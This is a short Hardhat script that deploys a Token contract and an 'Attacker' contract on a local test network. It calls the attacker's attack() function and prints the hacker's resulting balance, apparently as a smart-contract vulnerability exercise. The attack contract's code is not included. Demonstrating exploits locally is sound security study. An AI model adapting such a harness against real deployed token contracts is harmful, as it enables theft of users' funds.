const hre = require("hardhat");
const {waffle} = require("hardhat");

import { Signer } from "ethers";
const ethers = hre.ethers;
const provider = waffle.provider;

async function main(){
    let user: Signer, hacker: Signer;

    [user, hacker] = await ethers.getSigners();

    const Token = await ethers.getContractFactory("Token", user);
    const token = await Token.deploy(await ethers.utils.parseEther("10"));
    await token.deployed();

    console.log('Initially, token supply', await ethers.utils.formatEther(await token.totalSupply()));
    
    const Attacker = await ethers.getContractFactory("Attacker", hacker);
    const attacker = await Attacker.deploy(token.address);
    await attacker.deployed();

    await attacker.attack();

    console.log('Finally, token supply', await ethers.utils.formatEther(await token.balanceOf(await hacker.getAddress())));

}

main().then(()=>process.exit(0))
    .catch((err)=>{
        console.log(err);
        process.exit(1);
    })
    